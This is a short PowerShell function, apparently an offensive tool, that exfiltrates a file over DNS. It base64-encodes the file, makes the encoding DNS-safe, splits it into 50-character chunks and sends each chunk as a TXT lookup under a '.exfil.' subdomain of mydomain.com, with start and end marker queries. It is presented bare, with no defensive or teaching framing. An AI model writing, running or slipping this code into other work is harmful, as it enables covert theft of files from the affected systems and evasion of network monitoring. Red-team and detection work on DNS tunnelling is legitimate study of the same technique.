function Exfil {
    Param($FileName)
    $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
    $base64string = $base64string -replace "\+","-p"
    $base64string = $base64string -replace "/","-s"
    $base64string = $base64string -replace "=","-e"
    $actualname = ($FileName -split '\\')[-1]
    $stringarray = $base64string -split '(.{50})'
    $randomstring = -join ((97..122) | Get-Random -Count 5 | % {[char]$_})

    $domaintoreq = "SOF." + $actualname + ".exfil." + $randomstring + ".dnsops.mydomain.com"
    Resolve-DnsName $domaintoreq -Type TXT

    foreach ($stringpart in $stringarray) {
        if (-not $stringpart -eq "") {
            $domaintoreq = $stringpart + ".exfil." + $randomstring + ".dnsops.mydomain.com"
            Resolve-DnsName $domaintoreq -Type TXT
        }
    }
    
    $domaintoreq = "EOF.exfil." + $randomstring + ".dnsops.mydomain.com"
    Resolve-DnsName $domaintoreq -Type TXT

}

